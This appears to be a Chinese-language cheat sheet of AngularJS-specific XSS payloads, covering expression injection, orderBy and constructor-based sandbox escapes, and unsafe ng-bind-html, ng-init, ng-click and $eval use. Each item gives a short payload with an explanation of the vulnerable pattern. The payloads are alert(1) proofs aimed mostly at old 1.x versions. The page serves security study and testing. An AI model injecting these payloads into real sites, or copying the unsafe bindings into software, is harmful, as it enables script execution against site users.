# AngularJS特性的 XSS

### 简单表达注入&#xD;

`{{alert(1)}}`

如果使用 AngularJS 的网站在 Angular 模板中错误地包含用户提供的字符串（例如，通过 ng-bind-html 或直接包含在模板中）， \{{ ... \}} 表达式语法可能会导致代码执行。在旧版 AngularJS 中，如果将 \{{alert(1)\}} 注入表达式上下文，则会触发。

### orderBy 滤波器旁路&#xD;

`[1] | orderBy:'x=alert(1)'`

一个典型的 AngularJS 沙盒逃逸（1.6 之前），它错误地使用了 orderBy 过滤器。通过提供 'x=alert(1)' 作为排序参数，AngularJS 会对其进行解释，并最终执行 alert(1) 。

### 带表达式的 ng-init

```javascript
<div ng-init="x=alert(1)"></div>
```

ng-init 通常用于在 Angular 作用域中设置初始数据。如果能在 ng-init 属性中注入任意表达式，就可以执行 JavaScript。例如， ng-init="x=alert(1)" 将在编译指令时立即触发警报。

### 通过 constructor.constructor 污染原型&#xD;

`{{ ({}).toString.constructor('alert(1)')() }}`

在旧版 AngularJS 中，表达式可以部分访问 JavaScript 构造函数。通过遍历原型链并调用 constructor.constructor ，攻击者可以实例化新的 Function 并运行任意代码。

### ng-click 注射&#xD;&#xD;

```javascript
<button ng-click="alert(1)">Click Me</button>
```

如果应用程序将用户输入反映到 ng-click 或其他 ng-\* 指令属性中，就可以执行 JavaScript。例如，未转义的参数变成 ng-click="alert(1)" 实际上就是 XSS。

### ng-bind-html 不安全绑定

```javascript
<div ng-bind-html="userInput"></div>
<script>
  // userInput is set to: "<img src='x' onerror='alert(1)'/>"
</script>
```

ng-bind-html 如果没有 Angular 的 $sce （严格上下文转义）或额外的 sanitization，就会呈现未转义的 HTML，包括 标记或事件处理程序。攻击者可以提供恶意 HTML 来运行 JS。

### 基于注释的注入（旧版 Angular）&#xD;

在旧版 AngularJS（1.2 之前）中，您可以将表达式放在 HTML 注释中，Angular 仍会对其进行解析：

```javascript
<!-- {{alert(1)}} -->
```

Angular 用于解析注释中的表达式。攻击者可以在 HTML 注释中隐藏恶意代码，从而绕过某些天真的内容过滤器。

### $eval 或 $watch 注入&#xD;

`$scope.$eval("alert(1)");`

如果 AngularJS 应用程序将 $eval 或 $watch 暴露给用户输入，攻击者就可以传递任意表达式进行评估。如果开发人员使用 $eval(userInput) 而未进行消毒，就可能发生这种情况。

### i18n/本地化占位符&#xD;

```javascript
// If there's an i18n system that merges placeholders into Angular expressions:
"Hello {{user.name}}"
```



某些基于 Angular 的 i18n 系统或翻译工具会自动将占位符注入模板。如果用户控制的数据填充了占位符，攻击者就可以在翻译中插入 \{{alert(1)\}} ，从而导致 XSS。

### 多部分沙盒逃生&#xD;

`{y:''.constructor.prototype}.y.charAt=[].join; [1] | orderBy:'x=alert(1)'`

这种多阶段有效载荷首先会更改全局对象或原型，然后使用过滤器（如 orderBy ）来突破 Angular 的沙盒。这是 AngularJS 1.x 中较为复杂的已知旁路之一。

## 摘要:

1. 模板表达式： \{{ ... \}} 注入是最常见的。
2. 过滤器和指令：如果注入用户数据， orderBy 、 ng-init 、 ng-click 等都可能被滥用。
3. 原型污染：访问 .constructor.constructor 会创建函数。
4. 过度许可 ng-bind-html : 如果不执行 $sce 则允许直接注入 HTML/JS。
5. 较旧的 AngularJS 版本：这些有效载荷中有许多是针对较旧的 AngularJS 1.x 版本的，其中存在已知的沙箱逃脱问题，这些问题已在较新版本或现代 "Angular"（v2+）中得到修复。
